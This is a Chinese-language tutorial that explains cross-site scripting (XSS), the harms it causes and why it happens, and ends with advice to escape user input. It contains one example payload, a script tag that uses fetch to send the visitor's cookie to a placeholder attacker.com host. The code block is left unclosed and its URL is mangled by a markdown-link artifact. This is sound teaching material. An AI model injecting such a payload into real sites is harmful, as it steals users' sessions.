# 什么是 XSS 脚本？为什么会产生安全问题？

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是一种非常常见的网络安全漏洞。简单来说，就是攻击者把恶意的客户端脚本（通常是 JavaScript）注入到原本安全的网页中。当其他用户浏览这个网页时，浏览器就会误以为这些脚本是网站原本的一部分，从而自动执行它们。

为了好理解，我们可以把它想象成：一个坏人偷偷在学校的广播稿里加了一句私货，播音员（浏览器）没发现，照着读了出来，结果全校学生（用户）都听信了。

---

## 一、 为什么会产生安全问题？

XSS 之所以能造成严重的危害，核心原因在于**浏览器的信任机制**和**恶意脚本的执行权限**。一旦恶意脚本在用户的浏览器中运行，它就能干很多原本只有用户本人才能干的事。

以下是它能造成的几个主要安全问题：

* **盗用用户身份（Session Hijacking）**
    网页通常使用 Cookie 来记录你的登录状态。恶意脚本可以通过 `document.cookie` 轻松读取你的登录凭证（Session ID），并发送给攻击者。攻击者拿到后，不用输入密码就能直接登录你的账号。
* **窃取敏感信息**
    脚本可以监控你在网页上的输入。例如，在你登录网银或输入信用卡号时，恶意脚本可以像“键盘记录器”一样，把你输入的所有内容实时传回攻击者的服务器。
* **劫持网页与钓鱼（Phishing）**
    攻击者可以利用脚本修改网页的 HTML 结构。比如，在原本合法的购物网站上弹出一个高仿的登录框，提示你“登录超时，请重新输入密码”，从而骗取你的账户凭言。
* **传播蠕虫和恶意软件**
    恶意脚本还可以利用用户的身份，自动在网站内发送带有攻击链接的消息。如果是一个社交网站，这种攻击会像病毒（蠕虫）一样，通过好友关系链迅速扩散给成千上万的用户。

---

## 二、 它是怎么产生的？

XSS 漏洞的根源，在于网站**“过分信任了用户的输入，且没有做好隔离”**。

在开发网站时，经常需要接收用户提交的数据（比如评论、搜索框、用户名）。如果程序直接把用户输入的内容原封不动地拼接进 HTML 页面中展示，就会出问题。

### 举个具体的例子：
一个博客的评论区，原本大家都在正常留言。但有一个黑客输入了下面这段内容：

```html
<script>
  // 恶意的 JavaScript 代码，比如把用户的 Cookie 发给黑客
  fetch('[http://attacker.com/steal?cookie=](http://attacker.com/steal?cookie=)' + document.cookie);
</script>

> 💡 核心教训：
安全领域有一条铁律 —— “永远不要信任用户的输入”。要防御 XSS，网站必须对用户输入的任何内容进行严格的过滤或转义
（比如把 < 变成 &lt;，让浏览器只把它当文字看，而不是当代码执行）。
